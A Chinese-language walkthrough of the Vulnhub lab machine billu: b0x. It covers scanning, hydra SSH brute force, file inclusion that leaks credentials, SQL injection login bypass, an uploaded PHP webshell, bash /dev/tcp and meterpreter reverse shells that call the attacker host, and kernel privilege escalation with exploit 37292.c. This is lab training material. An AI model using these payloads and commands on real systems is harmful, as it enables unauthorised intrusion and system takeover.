# (Vulnhub练习)-- billu: b0x渗透实战

![image-20210927212115064](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272121936.png)

## 下载地址

```
http://www.vulnhub.com/entry/billu-b0x,188/
```

## 扫描主机

```
netdiscover -i eth0 -r 192.168.100.0/24
```

## 目标主机IP：192.168.100.156

## 信息收集

>  信息收集的步骤基本上差不多,可根据工具简单写个shell脚本

```sh
#!/usr/bin/bash

ip=192.168.100.$1

ping -c2 $ip &>/dev/null  
if [ $? -eq 0 ] ; then 
		echo "$ip is up"
	else 
			echo "$ip is down"
			    exit
fi

masscan --rate=10000 --ports 0-65535 $ip 
masscan --rate=10000 --ports 0-65535 $ip 
nmap -A $ip
sleep 30
whatweb $ip 
sleep 10
dirsearch  -u  $ip 
sleep 5
nikto -h $ip 
sleep 5
dirb http://$ip 
```

> 我的网段在192.168.100.0/24  所以**ip**要改改

```
 /home/xiaoxiaoran/shell/xinxi.sh 156
```

![image-20210927212244810](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272122954.png)

### 泛端口扫描

![image-20210927212850714](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272128831.png)

### nmap端口扫描

![image-20210927212906730](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272129931.png)

### 指纹识别

![image-20210927212921497](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272129590.png)

### 路径扫描

![image-20210927212744899](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272127170.png)

## 开始测试

## 对22端口进行弱密码扫描

```shell
hydra -L top500.txt -P top6000.txt  192.168.100.156  ssh  
```

> 如果你的字典用户名有root,密码有roottoor,那么恭喜游戏结束

## 对扫描的目录测试

- 在/add.php发现文件上传

  ![image-20210927215520799](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272155908.png)

- 在/in中发现phpinfo

```
http://192.168.100.156/in
```

![image-20210927214052859](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272140006.png)

- 在/phpmy中发现phpmyadmin

  ![image-20210927215109802](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272151918.png)

- 在/text.php中发现报错

  ```
  http://192.168.100.156/test.php
  ```

  ![image-20210927214937139](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272149252.png)

## 对文件包含测试

```
http://192.168.100.156/test.php
```

> burpsuite抓包,发到repeater,转为post请求

![image-20210927220400111](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272204331.png)

> 存在文件包含

> 包含c.php得到数据库密码

![image-20210927220533678](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272205896.png)

- billu
- b0x_billu

### 文件包含如果直接访问猜到的路径也不用奋斗了

![image-20210927222745332](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282102096.png)

> 在信息中直接有ssh root的登录信息

## 成功登录/phpmy

![image-20210927220752742](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272207893.png)

### 在ica_lab数据库中有一个表是auth

> 猜测应该是openssh密码或者前面的web登录密码

![image-20210927221028771](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272210891.png)

- 用户名：biLLu
- 密码：hEx_it

### **尝试登录web的主页；成功登录；**

![image-20210927221206210](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109272212399.png)

## 或者sql注入登录

![image-20210928205926856](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282059447.png)

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
$result = mysqli_query($conn, $run);
```

![image-20210928210131109](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282101228.png)

	'or 1=1-- -\' 成功绕过登录(密码一样)
> sql注入一个重要的原则就是闭合输入查询
>
> str_replace的作用是将字符串' 替换为空

## 观察图片上传和show,也存在文件包含

- 上传加一句话木马进图片xiu.jpg

```
<?php system($_GET['cmd']);?>
```

- 文件包含进xiu.jpg

```
load=%2Fuploaded_images%2Fxiu.jpg&continue=continue
```

![image-20210928220926667](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282209885.png)

## 把cmd=的值改成反弹shell(要url编码)

### 蚁剑连接post需要改cmd=

```
echo '<?php eval($_POST['pass'])?>' >> uploaded_images/shell.php
```

```
echo%20%27%3C%3Fphp%20eval(%24_POST%5B%27pass%27%5D)%3F%3E%27%20%3E%3E%20uploaded_images%2Fshell.php
```

![image-20210928222746491](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282227667.png)

### nc反弹shell需要改cmd=

```
echo "bash -i >& /dev/tcp/192.168.100.143/6666 0>&1" | bash
```

```
echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.143%2F6666%200%3E%261%22%20%7C%20bash
```

- kali端

![image-20210928223231701](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282232840.png)

### msf反弹shell需要改cmd=

- msfvenom生成木马

```
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

**linux.rc文件**

```sh
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

- 开启监听

```sh
msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
```

- 改cmd=

```
wget 192.168.100.143/xiao3 -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &
```

```
wget%20192.168.100.143%2Fxiao3%20-O%20%2Ftmp%2Fxiao3%3Bcd%20%2Ftmp%3Bchmod%20%2Bx%20xiao3%3B.%2Fxiao3%20%26
```

![image-20210928225146892](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282251020.png)



> 文件不能执行,失败

## 采用nc的shell提权

```
uname -a

cat /etc/issus
```

> Ubuntu 12.04.5 LTS \n \l

### 查看内核版本,然后再kali使用searchsploit查找是否有exp

```
searchsploit ubuntu 12.04
```

![image-20210928225821334](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282258735.png)

- 复制文件到www

```
cp /usr/share/exploitdb/exploits/linux/local/37292.c  /var/www/html/37292.c
```

- 在nc shell中执行

```
cd /tmp
wget 192.168.100.143/37292.c
gcc -pthread 37292.c -o exp -lcrypt  
./exp
```

![image-20210928230958304](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202109282309464.png)



